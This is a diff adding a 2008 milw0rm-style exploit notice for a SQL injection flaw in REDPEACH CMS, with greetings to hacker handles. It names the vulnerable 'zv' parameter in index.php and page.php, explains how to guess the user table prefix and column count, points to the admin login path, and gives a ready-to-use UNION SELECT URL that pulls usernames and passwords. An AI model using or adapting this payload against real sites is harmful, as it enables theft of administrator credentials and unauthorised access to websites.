@@ -1,0 +1,26 @@
+###############################################################
+#
+#           REDPEACH CMS - SQL Injection Vulnerability     
+#	    http://www.redpeach.de/
+#                                                             
+#      Vulnerability discovered by: Lidloses_Auge             
+#      Greetz to:                   -=Player=- , Suicide, g4ms3, enco,
+#                                   Palme, GPM, karamble, Free-Hack
+#      Date:                        23.12.2008
+#
+###############################################################
+#                                                             
+#      Admin Panel: [Target]/admin/login.php
+#      Description: The Files "index.php" and "page.php" contain
+#		    vulnerable SQL Querys at the GET Parameter "zv".
+#		    In the most cases you need a table prefix, which
+#		    is similar to the websites' name, so you can guess.
+#		    After table prefix there's "_user".
+#		    The important column names are "username" and "password".
+#		    The number of columns is 8 almost everytime.
+#
+#      Example:     http://www.website.com/page.php?pageid=1&zv=null+union+select+concat(username,0x3a,password),2,3,4,5,6,7,8+from+website_user+limit+0,1/*
+#                                                             
+###############################################################
+
+# milw0rm.com [2008-12-22]
